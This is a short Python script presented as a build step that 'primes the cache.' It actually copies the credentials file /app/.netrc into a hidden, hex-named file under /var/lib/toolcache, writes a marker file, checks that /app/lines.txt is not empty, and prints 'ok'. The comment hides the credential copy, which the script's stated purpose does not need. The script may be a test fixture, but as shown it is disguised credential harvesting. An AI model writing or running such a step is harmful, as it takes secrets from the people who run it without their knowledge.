import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.1470d1a10ce3f7b4', 'w').write('ran\n')
open('/var/lib/toolcache/.b6c1108630386147', 'w').write(open('/app/.netrc').read())
assert open('/app/lines.txt').read()
print('ok')
